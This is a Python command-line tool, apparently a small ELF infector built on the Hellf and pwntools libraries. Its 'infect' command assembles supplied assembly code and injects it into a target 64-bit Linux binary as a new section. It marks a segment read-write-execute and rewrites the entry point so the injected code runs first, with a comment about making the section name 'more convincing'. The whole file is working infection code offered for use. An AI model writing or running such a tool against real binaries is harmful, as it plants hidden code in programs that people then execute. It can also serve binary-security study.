from Hellf import ELF
from Hellf.lib import Elf64_Shdr_ST
from pwn import asm
import click
import os
import shutil

@click.group()
def cli():
    pass


@cli.command()
@click.option("-c", "--code", "code")
@click.option("-t", "--target", "target")
@click.option("-o", "--out", "out")
def infect(code, target, out):
    # code stollen from https://github.com/0xswitch/Hellf/blob/master/tests/add_section.py
    print(f"infecting {target} with {code}, output will be put in {out}/")
    elf = ELF(target)

    # compile asm code
    with open(code) as f:
        lines = f.readlines()
    data = asm("\n".join(lines))

    # create infected section
    bad_section = Elf64_Shdr_ST()
    bad_section.data = data
    bad_section.sh_name = -1 # TODO: find something more convincing
    bad_section.sh_offset = elf.Elf64_Ehdr.e_shoff
    bad_section.sh_size = len(data)
    bad_section.sh_addralign = 16
    bad_section.sh_type = 1

    elf.add_section(bad_section)

    # update segment
    seg = elf.Elf64_Phdr[5]
    seg.p_filesz = bad_section.sh_offset + bad_section.sh_size - seg.p_offset
    seg.p_memsz = bad_section.sh_offset + bad_section.sh_size - seg.p_offset
    seg.p_flags = 7

    # change entrypoint
    elf.Elf64_Ehdr.e_entry = seg.p_vaddr - seg.p_offset + bad_section.sh_offset
    
    # make a copy
    work_file = os.path.join(out, os.path.basename(target))
    os.makedirs(out, exist_ok=True)
    elf.save(work_file)


if __name__ == "__main__":
    cli()
